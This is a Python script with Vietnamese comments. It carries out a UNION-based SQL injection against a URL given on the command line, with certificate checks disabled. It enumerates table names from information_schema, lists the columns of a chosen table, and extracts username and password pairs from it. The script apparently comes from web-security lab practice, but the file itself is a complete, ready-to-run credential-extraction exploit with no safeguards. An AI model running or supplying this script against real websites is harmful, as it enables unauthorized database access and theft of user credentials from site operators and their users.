import requests
import sys
import urllib3
from bs4 import BeautifulSoup

url = sys.argv[1].strip()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#gửi một yêu cầu GET đến URL mục tiêu với một SQL payload được cung cấp và trả về phản hồi từ máy chủ.
def perform_request(sql_payload):
    r = requests.get(url +sql_payload, verify=False)
    return r

# thực hiện một cuộc tấn công SQL injection dựa trên UNION để lấy tất cả tên bảng từ cơ sở dữ liệu information_schema
# của cơ sở dữ liệu mục tiêu. Kết quả được in ra màn hình console.
def table_Name_union():
    sql_payload = "' UNION select null, table_name from information_schema.tables where table_type = 'BASE TABLE'--"
    r = perform_request(sql_payload)
    soup = BeautifulSoup(r.text, 'html.parser')
    tableName = soup.find_all("td")
    if not tableName:
        return False
    else:
        print("The tables found are: ")
        for i in tableName:
            print(i.text)
        return True

# nhận tên bảng làm đầu vào và thực hiện một cuộc tấn công SQL injection 
# dựa trên UNION khác để lấy tất cả tên cột từ bảng được chỉ định. Kết quả được in ra màn hình console.
def columnName_union(tableName):
    sql_payload = "' UNION select null, column_name from INFORMATION_SCHEMA.COLUMNS where table_name = '%s'--" %(tableName)
    r = perform_request(sql_payload)
    soup = BeautifulSoup(r.text, 'html.parser')
    tableName = soup.find_all("td")
    for i in tableName:
        print(i.text)

# nhận tên bảng, tên cột tên đăng nhập và tên cột mật khẩu làm đầu vào và thực hiện một cuộc tấn công SQL injection dựa trên UNION khác 
# để lấy tất cả các cặp tên đăng nhập và mật khẩu từ bảng được chỉ định. Kết quả được in ra màn hình console.
def userName_password_union(username,password,tableName):
    sql_payload = "' UNION select %s, %s from %s--" % (username,password,tableName)
    r = perform_request(sql_payload)
    soup = BeautifulSoup(r.text, 'html.parser')
    tableName = soup.find_all("td") + soup.find_all("th")
    for i in tableName:
        print(i.text)

if __name__ == "__main__":
    try:
        table_Name_union()
        print("Enter table name: ")
        tableName = input()
        columnName_union(tableName)
        print("Enter column name to get username: ")
        username = input()
        print("Enter column name to get password: ")
        password = input()
        userName_password_union(username,password,tableName)
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)